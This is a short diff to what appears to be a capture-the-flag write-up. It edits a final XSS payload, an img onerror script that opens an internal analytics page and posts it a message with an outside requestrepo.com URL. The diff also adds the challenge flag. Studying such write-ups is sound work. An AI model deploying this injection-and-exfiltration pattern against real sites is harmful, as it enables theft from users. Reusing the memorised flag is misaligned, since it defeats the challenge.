@@ -301,7 +301,7 @@ Final payload (prettified):
 
 
     <script>
-    const p = `const w=window.open(\\\'http://analytics:3000/integrate\\\', \\\'_blank\\\');setTimeout(() => {if (w) {w.postMessage({analytics:1,url:\\\'http://au3daluz.requestrepo.com\\\'}, \\\'*\\\');}} , 3000);`
+    const p = `const w=window.open(\\\'http://analytics:3000/integrate\\\', \\\'_blank\\\');setTimeout(() => {w.onload = () => {w.postMessage({analytics:1,url:\\\'http://au3daluz.requestrepo.com\\\'}, \\\'*\\\');}} , 3000);`
     const payload = `<img src=x onerror="${p}">`
     const interval = setInterval(() => {
             try {
@@ -337,5 +337,7 @@ Final payload (prettified):
 
 
 ```
+
+flag=`maltactf{th1s_w4s_4s_exh4ust1V3_aS_th3_C0nnection_P00l}`
 
 Great chall!
